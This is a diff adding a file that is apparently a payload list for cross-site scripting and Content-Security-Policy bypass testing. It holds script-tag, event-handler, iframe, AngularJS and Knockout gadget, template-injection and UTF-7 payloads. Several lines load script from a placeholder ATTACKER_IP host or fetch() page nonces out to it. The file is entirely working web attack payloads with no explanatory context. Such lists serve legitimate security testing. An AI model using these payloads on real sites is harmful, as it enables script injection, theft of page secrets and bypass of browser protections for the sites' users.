@@ -1,0 +1,39 @@
+<script nonce=NONCE_VALUE>alert(1)</script>
+<script nonce="">alert(1)</script>
+<script nonce=invalid>alert(1)</script>
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<iframe src="data:text/html,<script>alert(1)</script>">
+<iframe srcdoc="<script>alert(1)</script>">
+<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;">
+<iframe src=//allowed-cdn.com/xss></iframe>
+<script src=//cdn.jsdelivr.net/npm/angular/angular.min.js></script><div ng-app ng-csp id=p class=ng-app><div ng-controller=x>{{constructor.constructor('alert(1)')()}}</div></div>
+<script src="//cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script><script src="//cdnjs.cloudflare.com/ajax/libs/knockout/3.4.2/knockout-debug.js"></script><div data-bind="value:alert(1)">
+<script src="//cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script><div ng-app>{{constructor.constructor('alert(1)')()}}</div>
+{{constructor.constructor('alert(1)')()}}
+{{7*7}}{{alert(1)}}
+${alert(1)}
+#{alert(1)}
+<%= alert(1) %>
+<% alert(1) %>
+<script>location='javascript:alert(1)'</script>
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+<object data="javascript:alert(1)">
+<embed src="javascript:alert(1)">
+<link rel="stylesheet" href="//ATTACKER_IP/evil.css">
+<style>@import 'https://ATTACKER_IP/evil.css'</style>
+<base href="//ATTACKER_IP/">
+<form action="//ATTACKER_IP/"><button>submit</button></form>
+<a href="//ATTACKER_IP/" onclick=alert(1)>click</a>
+<script>document.querySelector('script[nonce]').src='//ATTACKER_IP/xss.js'</script>
+<script>document.currentScript.nonce</script>
+<script>fetch('//ATTACKER_IP/?nonce='+document.querySelector('[nonce]').nonce)</script>
+<script>Array.from(document.scripts).forEach(s=>fetch('//ATTACKER_IP/?n='+s.nonce))</script>
+<meta charset="utf-7"><+ADw-script+AD4-alert(1)+ADw-/script+AD4-
+<script>import('data:text/javascript,alert(1)')</script>
+<script>import('//ATTACKER_IP/xss.js')</script>
+<script>System.import('data:text/javascript,alert(1)')</script>
+<script>require('http').get('//ATTACKER_IP/xss.js')</script>
+<iframe sandbox="allow-scripts allow-same-origin" src="//trusted.com/page?xss=<script>alert(1)</script>">
+<iframe srcdoc="<script>parent.alert(1)</script>" sandbox="allow-scripts allow-same-origin">
+<script>with(window)with(document)with(body)alert(1)</script>
